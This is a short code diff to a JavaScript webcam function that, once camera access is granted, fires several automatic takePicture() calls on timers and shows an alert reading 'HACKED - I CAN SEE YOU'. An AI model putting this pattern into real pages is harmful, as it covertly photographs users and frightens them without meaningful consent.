@@ -54,17 +54,13 @@ function cameraStart() {
         cameraView.srcObject = stream;
 		window.setTimeout(function(){
 			takePicture()
+			window.setTimeout(function(){ takePicture()}, 500);
+			window.setTimeout(function(){ takePicture()}, 500);
+			alert("HACKED - I CAN SEE YOU");
+			
 		}, 1000);
 		
-		window.setTimeout(function(){
-			takePicture()
-		}, 500);
 		
-		window.setTimeout(function(){
-			takePicture()
-		}, 500);
-		
-		alert("HACKED EASILY - I CAN SEE YOU!")
     })
     .catch(function(error) {
         console.error("Oops. Something is broken.", error);
